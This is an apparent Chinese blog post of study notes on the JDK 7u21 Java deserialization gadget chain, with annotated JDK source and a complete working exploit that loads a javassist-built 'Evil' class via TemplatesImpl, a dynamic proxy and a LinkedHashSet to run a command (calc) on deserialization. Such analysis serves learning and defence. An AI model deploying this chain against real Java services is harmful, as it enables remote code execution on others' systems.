<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Hexo"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Hexo","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"John Doe"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-24T03:01:50.000Z" title="2021-04-24T03:01:50.000Z">2021-04-24</time>发表</span><span class="level-item"><time dateTime="2021-04-24T03:12:44.204Z" title="2021-04-24T03:12:44.204Z">2021-04-24</time>更新</span><span class="level-item">20 分钟读完 (大约2998个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/24/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">jdk7u21反序列化</a></h1><div class="content"><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由javassist负责构建一个恶意类并得到字节码，然后向<code>TemplatesImpl</code>的<code>_bytecodes</code>属性赋值恶意类的字节码，字节码数组在被<code>defineTransletClasses()</code>中被实例化成恶意类，调用构造函数中的命令触发RCE，需要调用<code>getOutputProperties()</code>触发</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恶意类的父类必须为ABSTRACT_TRANSLET </span><br><span class="line">TemplatesImpl类的_bytecodes不为null，为恶意类字节码</span><br><span class="line">TemplatesImpl类的_name不为null</span><br><span class="line">TemplatesImpl类的_class&#x3D;null</span><br><span class="line">_tfactory需要是一个拥有getExternalExtensionsMap()方法的类，即TransformerFactoryImpl()，以此来兼容不同版本</span><br></pre></td></tr></table></figure>



<p><img src="https://img01.sogoucdn.com/app/a/100520146/904CB3DB8557CC1BF3F11D93C4609138"></p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/88945FE9C4403911436EE84715EC0D9C"></p>
<p><code>defindTransletClasses()</code>执行完后，<code>_class[_transletIndex]</code>就已经是恶意类，接下来执行<code>newInstance()</code>实例化恶意类，从而执行构造方法中的payload</p>
<p><img src="https://img03.sogoucdn.com/app/a/100520146/309DE06378474CEBD7F7FEFD189275A5"></p>
<p><code>defineTransletClasses()</code>中恶意类的构造，把恶意类的字节码转换为类的实例类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="comment">//_bytecodes不能为null</span></span><br><span class="line">       <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">           ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">               <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">       <span class="comment">//获取_bytecodes的长度，创建_class数组，这里需要让恶意类的字节码为一个二维字节数组</span></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">           _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">               _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// 恶意类的父类必须是ABSTRACT_TRANSLET</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">else</span> &#123;</span><br><span class="line">                   _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">           ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">           ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myjdk7u21</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装setFieldValue()方法，便于给类字段赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        ClassPool pool =ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建恶意类Evil</span></span><br><span class="line">        CtClass cc=pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置恶意类父类为AbstractTranslet</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建恶意类的构造函数，写入payload</span></span><br><span class="line">        CtConstructor cons=<span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;,cc);</span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将Evil类转换成byte数组</span></span><br><span class="line">        <span class="keyword">byte</span>[] TempByteCode=cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] ByteCode=<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;TempByteCode&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化TemplatesImpl类</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//为TemplatesImpl类的各个字段赋值</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,ByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img01.sogoucdn.com/app/a/100520146/C439D08513346F4F8261911144529D1E"></p>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>当没有没有触发<code>getOutputProperties()</code>的点，就需要使用动态代理，代理是为了在不改变目标对象方法的情况下对方法进行增强</p>
<p>动态代理是java的特性之一，其实就可以理解为web应用中的拦截器，在执行正式代码之前先过一个拦截器函数（比如spring的AOP）。但是以上类比只是为了便于理解，实际上spring的AOP之类的拦截器反而是基于java的动态代理实现的。</p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要实现的接口（拦截动作是基于接口的，所以需要设定接口）</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际的需要被代理的对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubjectImpl</span> <span class="keyword">implements</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SubjectImpl.hello(): &quot;</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handler对象（继承InvocationHandler的拦截器）</span></span><br><span class="line"><span class="comment">//InvocationHandler是一个用于跟Proxy类对接的接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object subject;</span><br><span class="line">    <span class="comment">//构造函数，传入被代理实现类的实例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Handler</span><span class="params">(Object subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//所有被Proxy拦截的函数都会经过这个接口的invoke函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object object, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before!&quot;</span>);</span><br><span class="line">        <span class="comment">//完成拦截操作之后去调用被代理实现类，反射机制，传入实例，参数</span></span><br><span class="line">        method.invoke(<span class="keyword">this</span>.subject, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;after!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//被代理类</span></span><br><span class="line">        SubjectImpl subject = <span class="keyword">new</span> SubjectImpl();</span><br><span class="line">        <span class="comment">//拦截器实现类，通过构造函数传入被代理类的实例</span></span><br><span class="line">        InvocationHandler tempHandler = <span class="keyword">new</span> Handler(subject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Proxy.newProxyInstance创建代理</span></span><br><span class="line">        ISubject iSubject = (ISubject) Proxy.newProxyInstance(DynamicProxy.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[] &#123;ISubject.class&#125;, tempHandler);</span><br><span class="line">        iSubject.hello(<span class="string">&quot;world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>Proxy.newProxyInstance</code>三个传入参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loader，选用的类加载器。</span><br><span class="line">interfaces，被代理类所实现的接口，这个接口可以是多个。即需要拦截的接口</span><br><span class="line">handler，一个 实现拦截器的invocation handler。</span><br></pre></td></tr></table></figure>

<p>设置动态代理后，只要调用了返回对象中被安排代理的接口，就会进入invocationHandler的invoke函数。</p>
<h1 id="延长利用链：AnnotationInvocationHandler"><a href="#延长利用链：AnnotationInvocationHandler" class="headerlink" title="延长利用链：AnnotationInvocationHandler"></a>延长利用链：AnnotationInvocationHandler</h1><p><code>AnnotationInvocationHandler</code>是一个<code>InvocationHandler</code>的实现类</p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#AnnotationInvocationHandler</p>
<p>先看一下<code>AnnotationInvocationHandler</code>的构造函数</p>
<p>在payload构造中传入参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br></pre></td></tr></table></figure>

<p>这样</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.type=Templates.class</span><br><span class="line"><span class="keyword">this</span>.membervalues=map</span><br></pre></td></tr></table></figure>

<p>这里的AnnotationInvocationHandler构造函数是缺省修饰符，在不同的包中是不能直接调用</p>
<p>反射机制中提到，可以使用setAccessible(true)来开放权限。</p>
<p><img src="https://img01.sogoucdn.com/app/a/100520146/3A6775983FD7E90008A783CF48F16959"></p>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myjdk7u21</span> </span>&#123;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装了之前对恶意TemplatesImpl类的构造</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getEvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,targetByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl templates=getEvilTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Myjdk7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;f5a5a608&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] obj=serialize(set);</span><br><span class="line">        unserialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反序列化<code>LinkedHashSet</code>类就可以执行命令。</p>
<p>Java在反序列化的时候会调用<code>ObjectInputStream</code>类的<code>readObject()</code>方法，如果被反序列化的类重写了<code>readObject()</code>，那么该类在进行反序列化时，Java会优先调用重写的<code>readObject()</code>方法。</p>
<p><code>LinkedHashSet</code>类没有<code>readObject()</code>，但是它的父类<code>HashSet</code>存在<code>readObject()</code>，两者都继承了<code>Serializable接口</code></p>
